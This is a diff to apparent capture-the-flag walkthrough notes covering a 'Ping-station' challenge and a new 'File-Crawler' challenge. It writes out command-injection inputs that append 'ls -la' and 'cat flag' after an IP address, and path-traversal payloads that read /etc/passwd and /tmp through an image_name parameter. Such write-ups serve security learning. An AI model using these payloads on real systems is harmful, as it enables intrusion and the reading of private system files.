@@ -56,3 +56,10 @@ Ping-station
 1. Try the 'ls' command and realize the search bar needs an IP.
 2. Try 192.168.0.1; ls -la; using the semicolon for command separation
 3. in IP enter 192.168.0.1; cat flag
+
+File-Crawler
+
+1. Inspect the source code. Notice LFI local file incursion vulnerability in image_name parameter
+2. Try a simple payload: example.com/local?image_name=../../../etc/passwd
+3. example.com/local?image_name=..//..//..//etc//passwd
+4. look for /tmp folder, local?image_name=..//tmp
